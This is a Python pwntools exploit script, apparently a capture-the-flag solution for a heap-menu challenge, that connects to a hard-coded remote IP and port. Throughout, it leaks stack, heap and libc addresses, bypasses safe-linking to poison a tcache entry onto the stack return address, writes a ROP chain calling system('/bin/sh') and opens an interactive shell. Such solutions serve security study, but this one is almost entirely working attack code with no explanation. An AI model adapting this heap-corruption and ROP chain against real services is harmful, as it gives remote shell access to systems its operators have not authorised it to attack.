from pwn import *
from libs.NAUP_pwn_lib import *
import time
from libs.NAUP_filestructure_lib import *
from libs.NAUP_fmt_lib import *

def s(payload): return r.send(payload)
def sl(payload): return r.sendline(payload)
def sla(after, payload): return r.sendlineafter(after, payload)
def sa(after, payload): return r.sendafter(after, payload)
def rc(num): return r.recv(num)
def rcl(): return r.recvline()
def rcls(num): return r.recvlines(num)
def rcu(payload): return r.recvuntil(payload)
def ita(): return r.interactive()
def cl(): return r.close()
def tsl(): return time.sleep(0.2)

x64_env()

REMOTE_LOCAL=input("local?(y/n):")

if REMOTE_LOCAL=="y":
    r=process('./chal')
    debug_init()
    
else:                                           
    REMOTE_INFO=split_nc("nc 23.146.248.196 48763")

    REMOTE_IP=REMOTE_INFO[0]
    REMOTE_PORT=int(REMOTE_INFO[1])

    r=remote(REMOTE_IP,REMOTE_PORT)

### attach
if input('attach?(y/n)') == 'y':
    p(r)


### heap I/O
def create(size):
    sla(b'>>> ',b'1')
    sla(b'size:',str(size).encode())

def get(idx):
    sla(b'>>> ',b'2')
    sla(b'index: ', str(idx).encode())

def Set(idx,data):
    sla(b'>>> ',b'3')
    sla(b'index: ',str(idx).encode())
    sla(b'data: ',data)

def delete(idx):
    sla(b'>>> ',b'4')
    sla(b'index: ',str(idx).encode())

def EXIT():
    sla(b'>>> ',b'5')
### exploit

rcu('gift: ')
leakstack = int(rcl().strip()[:-1],16)<<4
retaddress = leakstack - 0x10

create(0x60)
create(0x60)
delete(0)
delete(1)
get(0)

rcu(b']: ')
leakheap = u64(rc(5).ljust(8,b'\x00'))
heapbase = leakheap << 12

chunk1_ptr_addr = heapbase + 0x290 - 0x10
chunk2_ptr_addr = heapbase + 0x300 - 0x10

dec_retaddress = retaddress ^ (chunk2_ptr_addr >> 12)
Set(1,p64(dec_retaddress))

create(0x60)
create(0x60)

create(0x600)
create(0x20)
delete(4)
get(4)
rcu(b']: ')
leaklibc = u64(rc(6).ljust(8,b'\x00'))
libcbase = leaklibc - 2206944

libc_system = libcbase + 0x50d70
pop_rdi = libcbase + 0x2a3e5
ret = pop_rdi + 0x1
binsh = libcbase + 0x1d8678

Set(3,b'a'*0x8+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(libc_system))

### INFO
NAUPINFO("LEAK STACK",hex(leakstack))
NAUPINFO("LEAKHEAP",hex(leakheap))
NAUPINFO("HEAP BASE",hex(heapbase))
NAUPINFO("CHUNK1 PTR",hex(chunk1_ptr_addr))
NAUPINFO("CHUNK2 PTR",hex(chunk2_ptr_addr))
NAUPINFO("retaddress",hex(retaddress))
NAUPINFO("LEAKLIBC",hex(leaklibc))
NAUPINFO("LIBCBASE",hex(libcbase))
### interactive
ita()